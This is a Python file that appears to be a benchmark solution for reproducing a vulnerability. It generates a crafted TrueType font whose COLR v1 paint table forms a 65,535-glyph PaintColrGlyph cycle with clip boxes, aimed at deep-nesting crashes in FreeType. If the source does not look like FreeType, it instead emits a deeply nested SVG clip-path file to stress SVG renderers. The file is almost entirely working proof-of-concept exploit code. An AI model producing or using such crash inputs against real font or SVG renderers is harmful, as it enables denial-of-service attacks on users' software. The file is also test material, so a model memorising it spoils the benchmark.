import os
import re
import struct
import tarfile
from typing import Dict, List, Optional, Tuple


def _u16(x: int) -> bytes:
    return struct.pack(">H", x & 0xFFFF)


def _s16(x: int) -> bytes:
    return struct.pack(">h", int(x))


def _u32(x: int) -> bytes:
    return struct.pack(">I", x & 0xFFFFFFFF)


def _checksum_u32(data: bytes) -> int:
    pad = (-len(data)) & 3
    if pad:
        data += b"\x00" * pad
    s = 0
    for i in range(0, len(data), 4):
        s = (s + int.from_bytes(data[i:i + 4], "big")) & 0xFFFFFFFF
    return s


def _sfnt_search_params(num_tables: int) -> Tuple[int, int, int]:
    # per OpenType spec
    max_pow2 = 1
    entry_selector = 0
    while (max_pow2 << 1) <= num_tables:
        max_pow2 <<= 1
        entry_selector += 1
    search_range = max_pow2 * 16
    range_shift = num_tables * 16 - search_range
    return search_range, entry_selector, range_shift


def _build_head(index_to_loc_format: int = 0) -> bytes:
    # TrueType 'head' table: 54 bytes
    # https://learn.microsoft.com/en-us/typography/opentype/spec/head
    # checkSumAdjustment is patched later.
    table_version = 0x00010000
    font_revision = 0x00010000
    check_sum_adjustment = 0
    magic_number = 0x5F0F3CF5
    flags = 0
    units_per_em = 1000
    created = 0
    modified = 0
    x_min = 0
    y_min = 0
    x_max = 0
    y_max = 0
    mac_style = 0
    lowest_rec_ppem = 8
    font_direction_hint = 2
    glyph_data_format = 0

    b = bytearray()
    b += _u32(table_version)
    b += _u32(font_revision)
    b += _u32(check_sum_adjustment)
    b += _u32(magic_number)
    b += _u16(flags)
    b += _u16(units_per_em)
    b += struct.pack(">q", created)
    b += struct.pack(">q", modified)
    b += _s16(x_min)
    b += _s16(y_min)
    b += _s16(x_max)
    b += _s16(y_max)
    b += _u16(mac_style)
    b += _u16(lowest_rec_ppem)
    b += _s16(font_direction_hint)
    b += _s16(index_to_loc_format)
    b += _s16(glyph_data_format)
    return bytes(b)


def _build_maxp(num_glyphs: int) -> bytes:
    # maxp version 1.0: 32 bytes
    b = bytearray()
    b += _u32(0x00010000)
    b += _u16(num_glyphs)
    # remaining fields: set to 0
    b += b"\x00" * (32 - len(b))
    return bytes(b)


def _build_hhea(number_of_hmetrics: int) -> bytes:
    # hhea: 36 bytes
    b = bytearray()
    b += _u32(0x00010000)  # version
    b += _s16(800)         # Ascender
    b += _s16(-200)        # Descender
    b += _s16(0)           # LineGap
    b += _u16(500)         # advanceWidthMax
    b += _s16(0)           # minLeftSideBearing
    b += _s16(0)           # minRightSideBearing
    b += _s16(500)         # xMaxExtent
    b += _s16(1)           # caretSlopeRise
    b += _s16(0)           # caretSlopeRun
    b += _s16(0)           # caretOffset
    b += b"\x00" * 8       # reserved
    b += _s16(0)           # metricDataFormat
    b += _u16(number_of_hmetrics)
    return bytes(b)


def _build_hmtx(num_glyphs: int, number_of_hmetrics: int = 1) -> bytes:
    # numberOfHMetrics full metrics, remaining only LSBs
    if number_of_hmetrics < 1:
        number_of_hmetrics = 1
    if number_of_hmetrics > num_glyphs:
        number_of_hmetrics = num_glyphs
    # For simplicity: 1 full metric, rest LSB=0
    b = bytearray()
    b += struct.pack(">Hh", 500, 0)
    b += b"\x00\x00" * (num_glyphs - 1)
    return bytes(b)


def _build_glyf_one_empty_glyph() -> bytes:
    # One empty simple glyph: numberOfContours=0, bbox=0, total 10 bytes
    return struct.pack(">hhhhh", 0, 0, 0, 0, 0)


def _build_loca_short(num_glyphs: int, glyph0_len: int) -> bytes:
    # short format: uint16 offsets divided by 2
    # entries = numGlyphs + 1
    # glyph 0 length = glyph0_len, glyph 1.. end length = 0
    # offsets: [0, glyph0_len, glyph0_len, ..., glyph0_len]
    off_div2 = (glyph0_len // 2) & 0xFFFF
    b = bytearray()
    b += struct.pack(">HH", 0, off_div2)
    b += struct.pack(">H", off_div2) * (num_glyphs - 1)
    return bytes(b)


def _build_cmap_format4_single() -> bytes:
    # cmap with one Unicode BMP encoding (platform 3, encoding 1), mapping U+0041 to glyph 0.
    # format 4 with two segments: [0x0041..0x0041] and end marker [0xFFFF..0xFFFF]
    seg_count = 2
    seg_count_x2 = seg_count * 2
    # searchRange = 2*(2^floor(log2(segCount)))
    max_pow2 = 1
    entry_selector = 0
    while (max_pow2 << 1) <= seg_count:
        max_pow2 <<= 1
        entry_selector += 1
    search_range = max_pow2 * 2
    range_shift = seg_count_x2 - search_range

    end_codes = [0x0041, 0xFFFF]
    start_codes = [0x0041, 0xFFFF]
    # idDelta: (glyphId - startCode) mod 65536; for glyph 0 at 0x0041 -> -0x0041 mod
    id_deltas = [(0 - 0x0041) & 0xFFFF, 1]  # end marker often 1, doesn't matter with idRangeOffset 0
    id_range_offsets = [0, 0]

    sub = bytearray()
    sub += _u16(4)       # format
    sub += _u16(0)       # length placeholder
    sub += _u16(0)       # language
    sub += _u16(seg_count_x2)
    sub += _u16(search_range)
    sub += _u16(entry_selector)
    sub += _u16(range_shift)
    for x in end_codes:
        sub += _u16(x)
    sub += _u16(0)  # reservedPad
    for x in start_codes:
        sub += _u16(x)
    for x in id_deltas:
        sub += _u16(x)
    for x in id_range_offsets:
        sub += _u16(x)
    # no glyphIdArray
    struct.pack_into(">H", sub, 2, len(sub))  # fill length

    cmap = bytearray()
    cmap += _u16(0)  # version
    cmap += _u16(1)  # numTables
    cmap += _u16(3)  # platformID
    cmap += _u16(1)  # encodingID
    cmap += _u32(12)  # offset to subtable from start of cmap
    cmap += sub
    return bytes(cmap)


def _build_name_empty() -> bytes:
    # name table with zero records
    # format=0, count=0, stringOffset=6
    return struct.pack(">HHH", 0, 0, 6)


def _build_post_v3() -> bytes:
    # post table format 3.0 is 32 bytes
    b = bytearray()
    b += _u32(0x00030000)
    b += b"\x00" * (32 - len(b))
    return bytes(b)


def _build_cpal_minimal() -> bytes:
    # CPAL v0: 1 palette, 1 entry
    # uint16 version
    # uint16 numPaletteEntries
    # uint16 numPalettes
    # uint16 numColorRecords
    # Offset32 colorRecordsOffset
    # uint16 colorRecordIndices[numPalettes]
    # ColorRecord[numColorRecords] (BGRA bytes)
    version = 0
    num_palette_entries = 1
    num_palettes = 1
    num_color_records = 1
    color_records_offset = 12 + 2 * num_palettes  # header (12) + indices
    b = bytearray()
    b += _u16(version)
    b += _u16(num_palette_entries)
    b += _u16(num_palettes)
    b += _u16(num_color_records)
    b += _u32(color_records_offset)
    b += _u16(0)  # first palette starts at color record 0
    b += bytes([0, 0, 0, 255])  # black opaque BGRA
    return bytes(b)


def _build_colr_v1_deep_clip(n_glyphs: int) -> bytes:
    # COLR v1 header (34 bytes) + BaseGlyphList + Paint tables + ClipList
    # Uses PaintColrGlyph recursion cycle to grow nesting depth.
    #
    # Assumptions aligned with OpenType COLR v1:
    # - COLR v1 extends v0 header with offsets:
    #   baseGlyphListOffset, layerListOffset, clipListOffset, varIndexMapOffset, itemVariationStoreOffset.
    # - BaseGlyphList: uint32 count, then records: uint16 glyphID + Offset32 paintOffset (from COLR start).
    # - PaintColrGlyph: uint8 format=0x07, uint16 glyphID.
    # - ClipList: uint8 format=1, uint32 numClipRecords, then records: uint16 start, uint16 end, Offset32 clipBoxOffset (from ClipList start).
    # - ClipBox: uint8 format=1, int16 xMin,yMin,xMax,yMax.
    PAINT_COLR_GLYPH = 0x07

    header_len = 34
    base_glyph_list_offset = header_len

    # BaseGlyphList: count + N records
    bg_count = n_glyphs
    bg_list = bytearray(4 + 6 * bg_count)
    struct.pack_into(">I", bg_list, 0, bg_count)

    paint_data_offset = base_glyph_list_offset + len(bg_list)
    paint_data = bytearray(3 * n_glyphs)
    paint_struct = struct.Struct(">BH")

    for gid in range(n_glyphs):
        paint_off = paint_data_offset + 3 * gid
        struct.pack_into(">HI", bg_list, 4 + 6 * gid, gid & 0xFFFF, paint_off & 0xFFFFFFFF)

        next_gid = (gid + 1) % n_glyphs
        paint_struct.pack_into(paint_data, 3 * gid, PAINT_COLR_GLYPH, next_gid & 0xFFFF)

    # ClipList
    # 1 clip record covering all glyphs, with a single clip box
    # ClipBoxOffset is relative to start of ClipList.
    clip_list = bytearray()
    clip_list += struct.pack(">B", 1)        # format
    clip_list += struct.pack(">I", 1)        # numClipRecords
    # record starts at offset 5
    clip_box_offset = 16  # choose 4-aligned
    clip_list += struct.pack(">HHI", 0, (n_glyphs - 1) & 0xFFFF, clip_box_offset)
    # pad to clip_box_offset
    if len(clip_list) < clip_box_offset:
        clip_list += b"\x00" * (clip_box_offset - len(clip_list))
    # ClipBoxFormat1
    clip_list += struct.pack(">Bhhhh", 1, 0, 0, 100, 100)

    # pad clip list to 4
    if len(clip_list) & 3:
        clip_list += b"\x00" * ((-len(clip_list)) & 3)

    # Assemble COLR: header + bg_list + paint_data + (pad) + clip_list
    colr = bytearray()
    # v0 header fields
    colr += _u16(1)   # version
    colr += _u16(0)   # numBaseGlyphRecords (v0)
    colr += _u32(0)   # baseGlyphRecordsOffset
    colr += _u32(0)   # layerRecordsOffset
    colr += _u16(0)   # numLayerRecords

    # v1 offsets (from COLR start)
    layer_list_offset = 0
    # clip list offset placed after bg_list + paint_data (+ pad to 4)
    body = bytes(bg_list) + bytes(paint_data)
    if (len(body) + header_len) & 3:
        body += b"\x00" * ((-(len(body) + header_len)) & 3)
    clip_list_offset = header_len + len(body)

    colr += _u32(base_glyph_list_offset)
    colr += _u32(layer_list_offset)
    colr += _u32(clip_list_offset)
    colr += _u32(0)  # varIndexMapOffset
    colr += _u32(0)  # itemVariationStoreOffset

    # ensure header length matches
    if len(colr) != header_len:
        # fallback: pad/truncate to 34 (shouldn't happen)
        if len(colr) < header_len:
            colr += b"\x00" * (header_len - len(colr))
        else:
            colr = colr[:header_len]

    colr += body
    colr += clip_list
    return bytes(colr)


def _build_ttf_with_colr_poc(num_glyphs: int) -> bytes:
    # Build a minimal TrueType font with many glyph IDs and a COLR v1 table triggering deep nesting.
    glyf0 = _build_glyf_one_empty_glyph()
    # Ensure glyf length is even for short loca
    if len(glyf0) & 1:
        glyf0 += b"\x00"

    tables: Dict[bytes, bytes] = {}
    tables[b"head"] = _build_head(index_to_loc_format=0)
    tables[b"maxp"] = _build_maxp(num_glyphs)
    tables[b"hhea"] = _build_hhea(number_of_hmetrics=1)
    tables[b"hmtx"] = _build_hmtx(num_glyphs, number_of_hmetrics=1)
    tables[b"glyf"] = glyf0
    tables[b"loca"] = _build_loca_short(num_glyphs, glyph0_len=len(glyf0))
    tables[b"cmap"] = _build_cmap_format4_single()
    tables[b"name"] = _build_name_empty()
    tables[b"post"] = _build_post_v3()
    tables[b"CPAL"] = _build_cpal_minimal()
    tables[b"COLR"] = _build_colr_v1_deep_clip(num_glyphs)

    # Offset table
    num_tables = len(tables)
    search_range, entry_selector, range_shift = _sfnt_search_params(num_tables)

    # Prepare sorted tags
    tags = sorted(tables.keys())

    # Compute table data with padding and checksums
    records: List[Tuple[bytes, int, int, int]] = []  # tag, checksum, offset, length
    offset_table_len = 12 + 16 * num_tables
    cur_off = offset_table_len

    table_datas: Dict[bytes, bytes] = {}
    for tag in tags:
        data = tables[tag]
        length = len(data)
        padded = data + (b"\x00" * ((-length) & 3))
        table_datas[tag] = padded
        chk = _checksum_u32(padded)
        records.append((tag, chk, cur_off, length))
        cur_off += len(padded)

    # Build font
    font = bytearray()
    font += _u32(0x00010000)  # scaler type
    font += _u16(num_tables)
    font += _u16(search_range)
    font += _u16(entry_selector)
    font += _u16(range_shift)

    for tag, chk, off, length in records:
        font += tag
        font += _u32(chk)
        font += _u32(off)
        font += _u32(length)

    for tag in tags:
        font += table_datas[tag]

    # Patch head.checkSumAdjustment
    head_off = None
    for tag, chk, off, length in records:
        if tag == b"head":
            head_off = off
            break
    if head_off is not None and head_off + 12 <= len(font):
        struct.pack_into(">I", font, head_off + 8, 0)
        whole_sum = _checksum_u32(bytes(font))
        adjustment = (0xB1B0AFBA - whole_sum) & 0xFFFFFFFF
        struct.pack_into(">I", font, head_off + 8, adjustment)

    return bytes(font)


def _tar_has_freetype_markers(src_path: str) -> bool:
    try:
        with tarfile.open(src_path, "r:*") as tf:
            names = tf.getnames()
            for n in names:
                ln = n.lower()
                if ln.endswith("include/freetype/freetype.h") or ln.endswith("/freetype.h"):
                    return True
                if ln.endswith("src/sfnt/ttcolr.c") or ln.endswith("ttcolr.c"):
                    return True
                if "freetype" in ln and (ln.endswith(".c") or ln.endswith(".h")):
                    # weak signal
                    return True
    except Exception:
        return False
    return False


def _fallback_svg_poc(target_size: int = 920000) -> bytes:
    # Deep nesting with clip-path to stress clip stack in many SVG renderers.
    header = b'<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"><defs><clipPath id="c"><rect x="0" y="0" width="1" height="1"/></clipPath></defs>'
    open_tag = b'<g clip-path="url(#c)">'
    close_tag = b'</g>'
    footer = b'</svg>'

    # Compute depth to approach target_size
    base = len(header) + len(footer)
    per = len(open_tag) + len(close_tag)
    if target_size <= base + per:
        return header + open_tag + close_tag + footer

    depth = (target_size - base) // per
    body = open_tag * depth + close_tag * depth
    return header + body + footer


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Heuristic: this issue description strongly matches FreeType COLR v1 deep nesting with clips.
        # If the tarball doesn't look like FreeType, return a generic deep-nesting SVG fallback.
        if src_path and os.path.exists(src_path) and _tar_has_freetype_markers(src_path):
            # Max TrueType numGlyphs = 65535; pick this to maximize nesting depth.
            return _build_ttf_with_colr_poc(65535)
        return _fallback_svg_poc(920000)